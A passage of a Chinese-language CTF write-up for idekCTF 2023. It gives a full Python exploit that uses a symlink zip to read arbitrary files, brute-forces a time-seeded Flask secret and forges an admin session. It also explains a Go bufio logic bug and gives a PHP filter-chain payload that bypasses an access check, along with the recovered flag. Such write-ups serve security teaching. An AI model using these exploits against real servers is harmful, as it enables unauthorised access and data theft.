file.save(filename)</span><br><span class="line">    subprocess.call([<span class="string">&quot;unzip&quot;</span>, filename, <span class="string">&quot;-d&quot;</span>, <span class="string">f&quot;<span class="subst">&#123;DATA_DIR&#125;</span>uploads/<span class="subst">&#123;uuidpath&#125;</span>&quot;</span>])    </span><br><span class="line">    flash(<span class="string">f&#x27;Your unique ID is &lt;a href=&quot;/uploads/<span class="subst">&#123;uuidpath&#125;</span>&quot;&gt;<span class="subst">&#123;uuidpath&#125;</span>&lt;/a&gt;!&#x27;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">    logger.info(<span class="string">f&quot;User <span class="subst">&#123;session.get(<span class="string">&#x27;uid&#x27;</span>)&#125;</span> uploaded file <span class="subst">&#123;uuidpath&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/upload&quot;</span>)</span><br></pre></td></tr></table></figure><p>uploads/xxx路由支持我们之间读取上传解压后的文件内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/uploads/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uploads</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> send_from_directory(DATA_DIR + <span class="string">&quot;uploads&quot;</span>, path)</span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        abort(<span class="number">404</span>)</span><br></pre></td></tr></table></figure><p>这个读文件部分按理说只能读取uploads下的文件，看看底层实现用的是safe_join不支持跨目录读取</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117172800202.png" alt="image-20230117172800202"></p><p>可以看到在这里获取路径path后，最终调用open打开文件并返回内容</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117172906258.png" alt="image-20230117172906258"></p><p>解决方法是可以配合symlink软连接实现任意文件读，这样我们一方面可以读config.py获取<code>SECRET_OFFSET</code></p><p>另一方面为了得到时间</p><p>可以看到题目很良心的在<code>server.log</code>当中输出了time</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Configure logging</span></span><br><span class="line">LOG_HANDLER = logging.FileHandler(DATA_DIR + <span class="string">&#x27;server.log&#x27;</span>)</span><br><span class="line">LOG_HANDLER.setFormatter(logging.Formatter(fmt=<span class="string">&quot;[&#123;levelname&#125;] [&#123;asctime&#125;] &#123;message&#125;&quot;</span>, style=<span class="string">&#x27;&#123;&#x27;</span>))</span><br><span class="line">logger = logging.getLogger(<span class="string">&quot;application&quot;</span>)</span><br><span class="line">logger.addHandler(LOG_HANDLER)</span><br><span class="line">logger.propagate = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> handler <span class="keyword">in</span> logging.root.handlers[:]:</span><br><span class="line">    logging.root.removeHandler(handler)</span><br><span class="line">logging.basicConfig(level=logging.WARNING, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s&#x27;</span>)</span><br><span class="line">logging.getLogger().addHandler(logging.StreamHandler())</span><br></pre></td></tr></table></figure><p>不过这个时间不是精确的，通过转换为时间戳我们只能精确到整数部分，不过好在这里随机数的seed是配合round做了取整因此我们就能很容易实现爆破了</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117140247774.png" alt="image-20230117140247774"></p><p>我们可以很方便配合这个信息得到time.time()的值</p><p>本地ln做一个symlink的文件</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117133315792.png" alt="image-20230117133315792"></p><p>之后爆破到<code>SECRET_KEY</code>后，修改admin为true再生成session即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">decoded = &#123;<span class="string">&#x27;admin&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;uid&#x27;</span>: userinfo[<span class="string">&#x27;username&#x27;</span>]&#125;</span><br></pre></td></tr></table></figure><p>最终exp，配合<a href="https://github.com/Paradoxis/Flask-Unsign">flask_unsign</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests, re, time, datetime, random</span><br><span class="line"><span class="keyword">import</span> flask_unsign</span><br><span class="line"></span><br><span class="line">sess = requests.session()</span><br><span class="line">SECRET_OFFSET = -<span class="number">67198624</span> * <span class="number">1000</span></span><br><span class="line">userinfo = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;yyds&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;yyds&quot;</span>&#125;</span><br><span class="line">baseurl = <span class="string">&quot;http://127.0.0.1:1337/&quot;</span></span><br><span class="line">pocZip = <span class="string">&quot;UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA&quot;</span></span><br><span class="line">cookie = <span class="string">&quot;&quot;</span></span><br><span class="line">log_url = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line">    reg_url = baseurl + <span class="string">&quot;register&quot;</span></span><br><span class="line">    sess.post(reg_url, userinfo)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    <span class="keyword">global</span> cookie</span><br><span class="line">    set_cookie = sess.post(baseurl + <span class="string">&quot;login&quot;</span>, data=userinfo, allow_redirects=<span class="literal">False</span>).headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line">    cookie = set_cookie[<span class="number">8</span>:<span class="number">82</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">global</span> log_url</span><br><span class="line">    log_url = re.search(<span class="string">&#x27;&lt;a href=&quot;/uploads/.*&quot;&gt;&#x27;</span>, sess.post(</span><br><span class="line">        baseurl + <span class="string">&quot;upload&quot;</span>, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;session=<span class="subst">&#123;cookie&#125;</span>&#x27;</span>&#125;,</span><br><span class="line">        files=&#123;<span class="string">&#x27;file&#x27;</span>: base64.b64decode(pocZip)&#125;).text).group()[<span class="number">9</span>:-<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>():</span></span><br><span class="line">    server_log = baseurl + log_url + <span class="string">&quot;/server.log&quot;</span></span><br><span class="line">    config = baseurl + log_url + <span class="string">&quot;/config.py&quot;</span></span><br><span class="line">    SECRET_OFFSET = <span class="built_in">int</span>(re.findall(<span class="string">&quot;SECRET_OFFSET = (.*?) # REDACTED&quot;</span>, sess.get(config).text)[<span class="number">0</span>]) * <span class="number">1000</span></span><br><span class="line">    log = sess.get(server_log).text</span><br><span class="line">    now = (time.mktime(datetime.datetime.strptime(log.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>][<span class="number">1</span>:<span class="number">20</span>], <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>).timetuple())) * <span class="number">1000</span></span><br><span class="line">    <span class="keyword">return</span> SECRET_OFFSET,now</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    register()</span><br><span class="line">    login()</span><br><span class="line">    upload()</span><br><span class="line">    SECRET_OFFSET, now = read()</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        decoded = &#123;<span class="string">&#x27;admin&#x27;</span>: <span class="literal">True</span>, <span class="string">&#x27;uid&#x27;</span>: userinfo[<span class="string">&#x27;username&#x27;</span>]&#125;</span><br><span class="line">        random.seed(<span class="built_in">round</span>(now + <span class="built_in">int</span>(SECRET_OFFSET)))</span><br><span class="line">        SECRET_KEY = <span class="string">&quot;&quot;</span>.join([<span class="built_in">hex</span>(random.randint(<span class="number">0</span>, <span class="number">15</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        flag_url = baseurl + <span class="string">&quot;flag&quot;</span></span><br><span class="line">        res = sess.get(flag_url, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">f&#x27;session=<span class="subst">&#123;flask_unsign.sign(decoded, SECRET_KEY)&#125;</span>&#x27;</span>&#125;).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;idek&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">            now += <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(now)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ReadMe"><a href="#ReadMe" class="headerlink" title="ReadMe"></a>ReadMe</h2><p>很简单签到题，算是个逻辑漏洞问题</p><p>这个程序中只有一个路由</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.HandleFunc(<span class="string">&quot;/just-read-it&quot;</span>, justReadIt)</span><br></pre></td></tr></table></figure><p>首先简单看一下可以得出程序逻辑如果能成功走到justReadIt函数最下方就能获得flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">justReadIt</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> r.Body.Close()</span><br><span class="line"></span><br><span class="line">body, err := ioutil.ReadAll(r.Body)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">&quot;bad request\n&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reqData := ReadOrderReq&#123;&#125;</span><br><span class="line"><span class="keyword">if</span> err := json.Unmarshal(body, &amp;reqData); err != <span class="literal">nil</span> &#123;</span><br><span class="line">w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">&quot;invalid body\n&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(reqData.Orders) &gt; MaxOrders &#123;</span><br><span class="line">w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(<span class="string">&quot;whoa there, max 10 orders!\n&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">reader := bytes.NewReader(randomData)</span><br><span class="line">validator := NewValidator()</span><br><span class="line"></span><br><span class="line">ctx := context.Background()</span><br><span class="line"><span class="keyword">for</span> _, o := <span class="keyword">range</span> reqData.Orders &#123;</span><br><span class="line"><span class="keyword">if</span> err := validator.CheckReadOrder(o); err != <span class="literal">nil</span> &#123;</span><br><span class="line">w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">&quot;error: %v\n&quot;</span>, err)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctx = WithValidatorCtx(ctx, reader, <span class="keyword">int</span>(o))</span><br><span class="line">_, err := validator.Read(ctx)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">&quot;failed to read: %v\n&quot;</span>, err)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := validator.Validate(ctx); err != <span class="literal">nil</span> &#123;</span><br><span class="line">w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">&quot;validation failed: %v\n&quot;</span>, err)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">w.WriteHeader(<span class="number">200</span>)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(os.Getenv(<span class="string">&quot;FLAG&quot;</span>)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们一点一点来看，首先是接受了一个传来的json数据，解析保存到reqData当中，从下面可以看出只接收一个完全由数字组成的int数组，字段名叫orders</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> ReadOrderReq <span class="keyword">struct</span> &#123;</span><br><span class="line">Orders []<span class="keyword">int</span> <span class="string">`json:&quot;orders&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后会用randomData初始化一个reader</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reader := bytes.NewReader(randomData)</span><br></pre></td></tr></table></figure><p>而这个randomData则是由initRandomData函数初始化，记住这个password复制在了12625之后</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">initRandomData</span><span class="params">()</span></span> &#123;</span><br><span class="line">rand.Seed(<span class="number">1337</span>)</span><br><span class="line">randomData = <span class="built_in">make</span>([]<span class="keyword">byte</span>, <span class="number">24576</span>)</span><br><span class="line"><span class="keyword">if</span> _, err := rand.Read(randomData); err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">copy</span>(randomData[<span class="number">12625</span>:], password[:])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化之后会遍历<code>reqData.Orders</code></p><p>调用<code>CheckReadOrder</code>检查oders中的int值范围是否在0-100</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Validator)</span> <span class="title">CheckReadOrder</span><span class="params">(o <span class="keyword">int</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> o &lt;= <span class="number">0</span> || o &gt; <span class="number">100</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;invalid order %v&quot;</span>, o)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后根据数值读出指定位数的值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctx = WithValidatorCtx(ctx, reader, <span class="keyword">int</span>(o))</span><br><span class="line">_, err := validator.Read(ctx)</span><br></pre></td></tr></table></figure><p>再往下就是最关键的地方，如果这里的validate校验过了才能拿到flag</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> err := validator.Validate(ctx); err != <span class="literal">nil</span> &#123;</span><br><span class="line">w.WriteHeader(<span class="number">500</span>)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">&quot;validation failed: %v\n&quot;</span>, err)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">w.WriteHeader(<span class="number">200</span>)</span><br><span class="line">w.Write([]<span class="keyword">byte</span>(os.Getenv(<span class="string">&quot;FLAG&quot;</span>)))</span><br></pre></td></tr></table></figure><p>这个函数功能就是读32位，之后与password比较，成功返回true，而我们前面说过这个password复制在了12625之后，并且oders数组容量最多只能有10个数字</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Validator)</span> <span class="title">Validate</span><span class="params">(ctx context.Context)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">r, _ := GetValidatorCtxData(ctx)</span><br><span class="line">buf, err := v.Read(WithValidatorCtx(ctx, r, <span class="number">32</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> bytes.Compare(buf, password[:]) != <span class="number">0</span> &#123;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;invalid password&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就算全取最大100，10个也才1000，距离我们的12625还差很远</p><p>再往前看发现read之前</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(v *Validator)</span> <span class="title">Read</span><span class="params">(ctx context.Context)</span> <span class="params">([]<span class="keyword">byte</span>, error)</span></span> &#123;</span><br><span class="line">r, s := GetValidatorCtxData(ctx)</span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, s)</span><br><span class="line">_, err := r.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">&quot;read error: %v&quot;</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> buf, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有这样一个调用，如果size大于等于100会调用一个bufio.NewReader</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetValidatorCtxData</span><span class="params">(ctx context.Context)</span> <span class="params">(io.Reader, <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">reader := ctx.Value(reqValReaderKey).(io.Reader)</span><br><span class="line">size := ctx.Value(reqValSizeKey).(<span class="keyword">int</span>)</span><br><span class="line"><span class="keyword">if</span> size &gt;= <span class="number">100</span> &#123;</span><br><span class="line">reader = bufio.NewReader(reader)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> reader, size</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个defaultBufSize是4096</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewReader returns a new Reader whose buffer has the default size.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewReader</span><span class="params">(rd io.Reader)</span> *<span class="title">Reader</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> NewReaderSize(rd, defaultBufSize)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117125832912.png" alt="image-20230117125832912"></p><h2 id="Paywall"><a href="#Paywall" class="headerlink" title="Paywall"></a>Paywall</h2><p>想看原理的移步陆队之前写的，我是脚本小子</p><p><a href="https://tttang.com/archive/1395/#toc_iconv-filter-chain">https://tttang.com/archive/1395/#toc_iconv-filter-chain</a></p><p>本题是用php实现的一个blog系统，除开样式读取核心代码非常简单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">        error_reporting(<span class="number">0</span>);</span><br><span class="line">        set_include_path(<span class="string">&#x27;articles/&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$article_content</span> = file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (strpos(<span class="variable">$article_content</span>, <span class="string">&#x27;PREMIUM&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Thank you for your interest in The idek Times, but this article is only for premium users!&#x27;</span>); <span class="comment">// <span class="doctag">TODO:</span> implement subscriptions</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (strpos(<span class="variable">$article_content</span>, <span class="string">&#x27;FREE&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;article&gt;<span class="subst">$article_content</span>&lt;/article&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;nothing here&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到，对于文章内容前是<code>PREMIUM</code>的不能读取，<code>FREE</code>的则可以读</p><p>很可惜我们的flag文件恰好前面也是<code>PREMIUM</code>，那么要想读取这个文件很显然我们可以配合php的filter构造出FREE四个字母也就可以实现读取了</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117141026989.png" alt="image-20230117141026989"></p><p>下面是工具</p><p><a href="https://github.com/synacktiv/php_filter_chain_generator">https://github.com/synacktiv/php_filter_chain_generator</a></p><p><a href="https://github.com/WAY29/php_filter_chain_generator">https://github.com/WAY29/php_filter_chain_generator</a></p><p>发现直接生成出来的虽然有FREE，但是都无法看了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FREE�B�5$TԕT���FV��F�F��U�E�7V&#x27;65##�u�C��W%��7w5�W&quot;����&gt;==�@C������&gt;==�@</span><br></pre></td></tr></table></figure><p>然而发现把每个环节的<code>convert.iconv.UTF8.UTF7</code>去掉</p><p>就可以变成明文了，脚本小子表示很神奇，最后为了不丢失符号(毕竟Base64字符里面没有一些特殊符号<code>!&#123;&#125;!</code>之类的)，因此第一步事先base64enccode一下</p><p>最终得到payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/?p=php://filter/convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><p>但是根据这样构造本地发现会少最后三个字符，除开}符号还剩两个</p><p>看看题目描述可以猜出最后俩字符，Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPPaper，最后一个字母肯定是个符号所以是!</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idek&#123;Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117164606331.png" 